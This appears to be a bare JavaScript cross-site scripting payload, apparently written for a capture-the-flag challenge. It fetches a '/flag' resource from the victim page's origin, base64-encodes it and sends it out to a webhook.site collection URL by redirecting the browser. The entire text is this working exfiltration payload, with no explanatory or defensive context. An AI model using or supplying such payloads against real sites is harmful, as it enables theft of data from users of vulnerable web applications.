fetch('/flag').then(r => r.text()).then(d => {
window.location.href = 'https://webhook.site/8cb65efc-852a-48d7-94c3-06e51c4aff4c?flag=' + btoa(d);
});
